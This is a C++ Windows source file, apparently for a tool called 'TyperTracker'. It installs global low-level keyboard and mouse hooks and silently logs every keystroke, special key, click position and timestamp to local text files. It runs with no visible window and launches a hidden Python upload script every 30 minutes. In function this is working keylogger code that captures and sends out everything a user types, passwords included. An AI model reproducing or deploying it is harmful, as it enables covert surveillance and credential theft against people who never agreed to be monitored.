#include "pch.h"
#include <iostream>
#include <ctime>
#include <string>
#include <fstream>
#include <Windows.h>

using namespace std;

HHOOK mouseHook;
HHOOK keyHook;
std::string output = "";
bool flag = false;

void addTimeClicked(std::string button) {
	time_t now = time(0);
	tm *ltm = localtime(&now);
	string result = to_string(ltm->tm_year) + to_string(ltm->tm_mon) + to_string(ltm->tm_mday);
	ofstream outputFile("C:\\Users\\aquin\\Documents\\Code\\C++\\TyperTracker\\TyperTracker\\clickTime.txt", fstream::app);
	outputFile << result << std::endl;
}

void addPlaceClicked(int x, int y) {
	ofstream outputFile("C:\\Users\\aquin\\Documents\\Code\\C++\\TyperTracker\\TyperTracker\\clickPlace.txt", fstream::app);
	outputFile << x << std::endl << y << std::endl;
}

void addSpecialTyped(UINT code) {
	ofstream outputFile("C:\\Users\\aquin\\Documents\\Code\\C++\\TyperTracker\\TyperTracker\\typeChar.txt", fstream::app);
	string alt = "";
	switch (code) {
		case 106: alt = "prtsc"; break;
		case 45: alt = "insert"; break;
		case 46: alt = "delete"; break;
		case 71: alt = "play"; break;
		case 81: alt = "rewind"; break;
		case 80: alt = "fast forward"; break;
		case 20: alt = "caps"; break;
		case 16: alt = "shift"; break;
		case 17: alt = "ctrl"; break;
		case 37: alt = "left"; break;
		case 38: alt = "up"; break;
		case 40: alt = "down"; break;
		case 39: alt = "right"; break;
		case 144: alt = "num lock"; break;
	}
	if (alt != "") {
		outputFile << alt << std::endl;
	}
}

void addCharTyped(char charTyped) {
	ofstream outputFile("C:\\Users\\aquin\\Documents\\Code\\C++\\TyperTracker\\TyperTracker\\typeChar.txt", fstream::app);
	string alt = "";
	switch (charTyped) {
		case VK_RETURN: alt = "enter"; break;
		case VK_BACK: alt = "back"; break;
		case VK_TAB: alt = "tab"; break;
		case VK_ESCAPE: alt = "esc"; break;
	}
	if (alt == "") {
		outputFile << charTyped << std::endl;
	} else {
		outputFile << alt << std::endl;
	}
}

void addTimeTyped() {
	time_t now = time(0);
	tm *ltm = localtime(&now);
	string result = to_string(ltm->tm_year) + to_string(ltm->tm_mon) + to_string(ltm->tm_mday);
	ofstream outputFile("C:\\Users\\aquin\\Documents\\Code\\C++\\TyperTracker\\TyperTracker\\typeTime.txt", fstream::app);
	outputFile << result << std::endl;
}

LRESULT __stdcall KeyHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		auto kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		if (wParam == WM_KEYDOWN) {
			UINT raw = MapVirtualKey(kbdStruct.vkCode, 2);
			if (raw != 0) {
				char c = MapVirtualKey(kbdStruct.vkCode, 2);
				addCharTyped(c);
				addTimeTyped();
			} else {
				UINT uCode = MapVirtualKey(kbdStruct.scanCode, 1);
				addSpecialTyped(uCode);
				//cout << "press " << uCode << endl;
			}
		}
	}
	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

LRESULT __stdcall MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	time_t now = time(0);
	tm *ltm = localtime(&now);
	//7 is random, change for amount of minutes between uploads
	if (ltm->tm_min % 30 == 0) {
	//if (ltm->tm_min == 5) {
		if (!flag) {
			WinExec("pythonw C:\\Users\\aquin\\Documents\\Code\\C++\\TyperTracker\\upload.py", SW_HIDE);
			flag = true;
		}
	} else {
		flag = false;
	}

	if (nCode >= 0) {
		POINT pt;
		GetCursorPos(&pt);
		switch (wParam) {
		case WM_LBUTTONDOWN:
			addTimeClicked("leftClick");
			addPlaceClicked(pt.x, pt.y);
			break;

		case WM_RBUTTONDOWN:
			addTimeClicked("rightClick");
			addPlaceClicked(pt.x, pt.y);
			break;
		}
	}
	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

void SetHook() {
	if (!(mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, NULL, 0))) {
		cout << "Failed to install mouse hook!" << endl;
	}
	if (!(keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookCallback, NULL, 0))) {
		cout << "Failed to install keyboard hook!" << endl;
	}
}

void ReleaseHook() {
	UnhookWindowsHookEx(mouseHook);
	UnhookWindowsHookEx(keyHook);
}

//int main() {
//int WINAPI WinMain(
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	SetHook();
	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}